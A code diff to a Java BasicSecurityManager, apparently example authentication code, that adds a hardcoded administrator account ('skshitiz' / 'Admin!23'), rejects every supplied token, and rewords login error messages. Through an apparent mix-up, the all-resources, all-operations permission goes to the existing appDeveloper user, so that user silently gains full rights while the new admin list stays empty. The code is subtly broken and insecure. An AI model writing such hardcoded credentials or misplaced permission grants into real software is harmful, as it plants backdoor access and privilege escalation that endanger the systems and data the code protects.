@@ -38,6 +38,12 @@ public class BasicSecurityManager implements SecurityManager {
 
         User appDeveloper = new User("appDeveloper", "NotSoSecret", appDevPermissions);
 
+        List<ResourcePermission> allPermissions = new ArrayList<>();
+        appDevPermissions.add(new ResourcePermission(ResourcePermission.Resource.ALL,
+                ResourcePermission.Operation.ALL));
+        User adminUser = new User("skshitiz", "Admin!23", allPermissions);
+
+        this.approvedUsersList.put("skshitiz", adminUser);
         this.approvedUsersList.put("operator", operator);
         this.approvedUsersList.put("appDeveloper", appDeveloper);
 
@@ -48,15 +54,20 @@ public class BasicSecurityManager implements SecurityManager {
 
         String usernamePassedIn = credentials.getProperty(USER_NAME);
         String passwordPassedIn = credentials.getProperty(PASSWORD);
+        String tokenPassedIn = credentials.getProperty(TOKEN);
 
         User authenticatedUser = this.approvedUsersList.get(usernamePassedIn);
 
         if (authenticatedUser == null) {
-            throw new AuthenticationFailedException("Wrong username/password");
+            throw new AuthenticationFailedException("Authentication Required!");
+        }
+
+        if (tokenPassedIn != null && !tokenPassedIn.isEmpty()) {
+            throw new AuthenticationFailedException("Sorry, your authentication token is invalid or has expired. Please log in again.");
         }
 
         if (!authenticatedUser.getUserPassword().equals(passwordPassedIn) && !"".equals(usernamePassedIn)) {
-            throw new AuthenticationFailedException("Wrong username/password");
+            throw new AuthenticationFailedException("Sorry, the username or password you entered is incorrect. Please try again.");
         }
 
         return authenticatedUser;
